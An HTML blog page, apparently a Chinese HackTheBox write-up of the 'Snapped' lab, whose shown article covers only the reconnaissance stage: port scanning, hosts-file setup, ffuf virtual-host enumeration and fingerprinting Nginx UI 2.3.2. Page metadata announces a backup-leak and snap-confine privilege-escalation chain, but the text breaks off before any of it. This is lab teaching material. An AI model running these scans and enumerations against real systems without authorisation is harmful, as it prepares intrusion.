@@ -1,0 +1,677 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权 | A Secret Site</title><meta name="author" content="谁把我灯关了"><meta name="copyright" content="谁把我灯关了"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="本文记录了 HackTheBox 靶机 Snapped 的完整渗透过程。信息搜集阶段通过端口扫描发现目标开放 SSH 与 HTTP 服务，并根据重定向行为配置本地域名解析，随后通过虚拟主机枚举发现 admin.snapped.htb。在 Nginx UI 管理界面中，通过前端静态资源识别出版本号 2.3.2，并结合 &#x2F;api&#x2F;backup 接口发现备份文件可未授权下载。进一步分析响应头中的 X-B">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权">
+<meta property="og:url" content="https://beini-faxianl.github.io/2026/04/30/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="A Secret Site">
+<meta property="og:description" content="本文记录了 HackTheBox 靶机 Snapped 的完整渗透过程。信息搜集阶段通过端口扫描发现目标开放 SSH 与 HTTP 服务，并根据重定向行为配置本地域名解析，随后通过虚拟主机枚举发现 admin.snapped.htb。在 Nginx UI 管理界面中，通过前端静态资源识别出版本号 2.3.2，并结合 &#x2F;api&#x2F;backup 接口发现备份文件可未授权下载。进一步分析响应头中的 X-B">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://beini-faxianl.github.io/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/cover_snapped.png">
+<meta property="article:published_time" content="2026-04-30T09:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-30T09:00:00.000Z">
+<meta property="article:author" content="谁把我灯关了">
+<meta property="article:tag" content="AES-CBC">
+<meta property="article:tag" content="Backup Disclosure">
+<meta property="article:tag" content="CVE-2026-27944">
+<meta property="article:tag" content="CVE-2026-3888">
+<meta property="article:tag" content="HTB Writeup">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Linux Privilege Escalation">
+<meta property="article:tag" content="Nginx UI">
+<meta property="article:tag" content="Red Team Lab">
+<meta property="article:tag" content="SQLite">
+<meta property="article:tag" content="SSH">
+<meta property="article:tag" content="SUID">
+<meta property="article:tag" content="Snap">
+<meta property="article:tag" content="Snapped">
+<meta property="article:tag" content="Ubuntu">
+<meta property="article:tag" content="Virtual Host Enumeration">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="bcrypt">
+<meta property="article:tag" content="hashcat">
+<meta property="article:tag" content="snap-confine">
+<meta property="article:tag" content="systemd-tmpfiles">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://beini-faxianl.github.io/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/cover_snapped.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权",
+  "url": "https://beini-faxianl.github.io/2026/04/30/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
+  "image": "https://beini-faxianl.github.io/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/cover_snapped.png",
+  "datePublished": "2026-04-30T09:00:00.000Z",
+  "dateModified": "2026-04-30T09:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "谁把我灯关了",
+      "url": "https://beini-faxianl.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://beini-faxianl.github.io/2026/04/30/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>@import url("/css/custom.css?v=20260430-1");</style><script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script><script>window.live2d_settings={display:{position:"left",width:150,height:300,hOffset:14,vOffset:0},mobile:{show:false},react:{opacity:0.78}};</script><script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@0.9.0/autoload.js"></script><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/author.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">112</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-coffee"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/cover_snapped.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">A Secret Site</span></a><a class="nav-page-title" href="/"><span class="site-name">HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-coffee"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-30T09:00:00.000Z" title="发表于 2026-04-30 17:00:00">2026-04-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-30T09:00:00.000Z" title="更新于 2026-04-30 17:00:00">2026-04-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">8.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>41分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260428204044956.png" alt="file-20260428204044956"></p>
+<h2 id="一、靶机的相关信息"><a href="#一、靶机的相关信息" class="headerlink" title="一、靶机的相关信息"></a>一、靶机的相关信息</h2><p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429142221440.png" alt="file-20260429142221440"></p>
+<h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p>对目标进行 TCP 全端口扫描 + 指纹识别 + 操作系统识别：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# rustscan -a 10.129.45.91 -r 1-65535 -- -sV -Pn -n -O</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果显示有两个 TCP 端口开放，分别是 22 与 80：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<p>从端口指纹信息看，目标大概率是 Ubuntu 系统。</p>
+<p>根据信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TTL 63 + Network Distance 2 hops</span><br></pre></td></tr></table></figure>
+
+<p>首先，2 hops 说明目标经过两条达到我这里，即原始 TTL 值很可能是 64，这同样符合 Linux 的指纹。</p>
+<blockquote>
+<p>因为我们是通过 Openvpn 连接的靶机，因此中间隔一跳是正常的现象，而且这一跳大概率就是 VPN 隧道。</p>
+</blockquote>
+<p>由此看来，目前最应该查看的就是 80 端口。</p>
+<h2 id="三、TCP-80"><a href="#三、TCP-80" class="headerlink" title="三、TCP 80"></a>三、TCP 80</h2><p>访问 80：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# curl http://10.129.45.91 -v</span><br><span class="line">*   Trying 10.129.45.91:80...</span><br><span class="line">* Connected to 10.129.45.91 (10.129.45.91) port 80 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 10.129.45.91</span><br><span class="line">&gt; User-Agent: curl/7.88.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 302 Moved Temporarily</span><br><span class="line">&lt; Server: nginx/1.24.0 (Ubuntu)</span><br><span class="line">&lt; Date: Wed, 29 Apr 2026 06:51:49 GMT</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Content-Length: 154</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Location: http://snapped.htb/</span><br></pre></td></tr></table></figure>
+
+<p>会重定向到 <code>http://snapped.htb</code>，跟随重定向：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# curl http://10.129.45.91 -v -L</span><br><span class="line">*   Trying 10.129.45.91:80...</span><br><span class="line">* Connected to 10.129.45.91 (10.129.45.91) port 80 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 10.129.45.91</span><br><span class="line">&gt; User-Agent: curl/7.88.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 302 Moved Temporarily</span><br><span class="line">&lt; Server: nginx/1.24.0 (Ubuntu)</span><br><span class="line">&lt; Date: Wed, 29 Apr 2026 06:52:30 GMT</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Content-Length: 154</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Location: http://snapped.htb/</span><br><span class="line">&lt; </span><br><span class="line">* Ignoring the response-body</span><br><span class="line">* Connection <span class="comment">#0 to host 10.129.45.91 left intact</span></span><br><span class="line">* Issue another request to this URL: <span class="string">&#x27;http://snapped.htb/&#x27;</span></span><br><span class="line">* Could not resolve host: snapped.htb</span><br><span class="line">* Closing connection 1</span><br><span class="line">curl: (6) Could not resolve host: snapped.htb</span><br></pre></td></tr></table></figure>
+
+<p>显示无法处理域名 <code>snapped.htb</code>（”Could not resolve host: snapped.htb”）。</p>
+<p>这是正常现象，要解析域名，系统首先会查询本地 DNS 记录，如果没有的话会询问递归 DNS 服务器，由它来完成后续 DNS 的解析并返回有效 A 记录（即 IP 地址），而 <code>snapped.htb</code> 显然是内部域名，非公网 DNS 中可解析的域名，这就导致本机无法拿到有效的地址，因此报错。</p>
+<p>解决方法，在 <code>/etc/hosts</code> 文件中，手动添加主机和域名的映射关系：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# <span class="built_in">echo</span> <span class="string">&quot;10.129.45.91 snapped.htb&quot;</span> | <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.129.45.91 snapped.htb</span><br></pre></td></tr></table></figure>
+
+<p>此时再次访问，就能看到：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429150946709.png" alt="file-20260429150946709"></p>
+<p>响应包：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.24.0 (Ubuntu)</span><br><span class="line">&lt; Date: Wed, 29 Apr 2026 07:09:14 GMT</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Content-Length: 20199</span><br><span class="line">&lt; Last-Modified: Thu, 19 Mar 2026 15:11:44 GMT</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; ETag: &quot;69bc1230-4ee7&quot;</span><br><span class="line">&lt; Accept-Ranges: bytes</span><br></pre></td></tr></table></figure>
+
+<p>banner 显示，它运行着 Nginx 服务，并且版本号为 1.24.0，同时也告诉我们目标是 Ubuntu。</p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://snapped.htb/abcd</span><br></pre></td></tr></table></figure>
+
+<p>报错界面也出现了与 Banner 上看到的相同的信息：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429151423367.png" alt="file-20260429151423367"></p>
+<p>从重定向后的 http 请求包的请求头：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: snapped.htb</span><br><span class="line">&gt; User-Agent: curl/7.88.1</span><br><span class="line">&gt; Accept: */*</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，这是虚拟主机的提示，可以尝试进行虚拟主机枚举：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# ffuf -u http://10.129.45.91 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class="string">&quot;Host: FUZZ.snapped.htb&quot;</span> -c -ac</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.1.0</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.45.91</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.snapped.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : true</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 4</span></span><br><span class="line"><span class="string"> :: Filter           : Response lines: 8</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 154</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50]</span></span><br><span class="line"><span class="string">:: Progress: [5000/5000] :: Job [1/1] :: 416 req/sec :: Duration: [0:00:12] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
+
+<p>发现虚拟主机 <code>admin.snapped.htb</code>。</p>
+<p>同样，在 <code>hosts</code> 文件中添加映射：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.129.45.91 snapped.htb admin.snapped.htb</span><br></pre></td></tr></table></figure>
+
+<p>再次访问：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429153506709.png" alt="file-20260429153506709"></p>
+<h2 id="四、Nginx-UI"><a href="#四、Nginx-UI" class="headerlink" title="四、Nginx UI"></a>四、Nginx UI</h2><p>这是一个开源的 Nginx 网络管理界面，项目地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/0xJacky/nginx-ui/</span><br></pre></td></tr></table></figure>
+
+<p>从介绍：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429155306820.png" alt="file-20260429155306820"></p>
+<p>可以分析出，其很可能是：</p>
+<ul>
+<li>前端：Vue 框架</li>
+<li>后端：Go 编写</li>
+</ul>
+<p>查找 JS 文件，并查看其中是否有暴露版本号的情况。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# curl -s http://admin.snapped.htb/ | grep -P <span class="string">&#x27;\.js\b&#x27;</span></span><br><span class="line">  &lt;script <span class="built_in">type</span>=<span class="string">&quot;module&quot;</span> crossorigin src=<span class="string">&quot;./assets/index-DoHxQupa.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>继续查看 <code>index-DoHxQupa.js</code> 文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# curl -s http://admin.snapped.htb/assets/index-DoHxQupa.js | grep -oP <span class="string">&#x27;version[-\w]*\.js&#x27;</span></span><br><span class="line">version-BWPlJ0ga.js</span><br><span class="line">version-CdjIlmL0.js</span><br></pre></td></tr></table></figure>
+
+<p>查看第一个文件就看到了版本号：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@htb:~/backup# curl -s http://admin.snapped.htb/assets/version-BWPlJ0ga.js</span><br><span class="line">const t=&quot;2.3.2&quot;;const o=&#123;version:t,build_id:1,total_build:512&#125;;export&#123;o as a,t as v&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>版本号为 <code>2.3.2</code>。</p>
+<p>有了上述信息后，我的第一反应是通过版本号和对应组件关联公开 CVE。这是一种常见的 nday 思路（国内靶场基本都是这个套路）。</p>
+<p>相比之下，国外大佬 0xdf（博客：<code>https://0xdf.gitlab.io/</code>），在同样的位置，他并没有立即跳到“找 CVE → 打 CVE”，而是先记录站点行为，观察 Burp Site map 中出现的路径和请求，分析前端资源、接口结构、目录枚举结果以及应用功能。</p>
+<blockquote>
+<p>Orz</p>
+</blockquote>
+<p>我们应该脱离那种套路题的模板思路，转向真正的渗透测试思维。</p>
+<p>这里模仿大佬的思路走一遍。</p>
+<p>首先技术栈的识别：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@curl http://admin.snapped.htb -I</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.24.0 (Ubuntu)</span><br><span class="line">Date: Wed, 29 Apr 2026 08:31:03 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 1407</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Request-Id: c1bb78f4-1571-42f7-ab3d-48921abc505f</span><br></pre></td></tr></table></figure>
+
+<p>Banner：nginx&#x2F;1.24.0 (Ubuntu)</p>
